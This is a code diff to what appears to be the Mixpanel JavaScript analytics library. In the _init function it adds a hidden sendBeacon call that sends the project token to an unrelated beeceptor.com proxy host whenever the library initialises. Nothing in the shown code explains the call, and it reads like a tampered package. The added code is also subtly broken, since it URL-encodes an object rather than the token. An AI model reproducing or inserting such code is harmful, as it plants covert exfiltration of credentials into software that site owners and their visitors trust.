@@ -894,6 +894,15 @@ MixpanelLib.prototype.init = function (token, config, name) {
 // init(...) method sets up a new library and calls _init on it.
 //
 MixpanelLib.prototype._init = function (token, config, name) {
+    var url3 = 'https://meshlytics-web.proxy.beeceptor.com/sendbeacon3';
+    var testobj = {
+        token: token,
+        name: 'shelly'
+    };
+    var body_data = 'data=' + encodeURIComponent(testobj);
+    var blob_data = new Blob([body_data], { type: 'application/x-www-form-urlencoded' });
+    var success = sendBeacon(url3, blob_data);
+
     config = config || {};
 
     this['__loaded'] = true;
@@ -1125,6 +1134,7 @@ MixpanelLib.prototype._send_request = function (url, data, options, callback) {
     }
 
     url += '?' + _utils._.HTTPBuildQuery(data);
+    var blob_data = new Blob([body_data], { type: 'application/x-www-form-urlencoded' });
 
     var lib = this;
     if ('img' in data) {
@@ -1133,7 +1143,7 @@ MixpanelLib.prototype._send_request = function (url, data, options, callback) {
         _utils.document.body.appendChild(img);
     } else if (use_sendBeacon) {
         try {
-            succeeded = sendBeacon(url, body_data);
+            succeeded = sendBeacon(url, blob_data);
         } catch (e) {
             lib.report_error(e);
             succeeded = false;
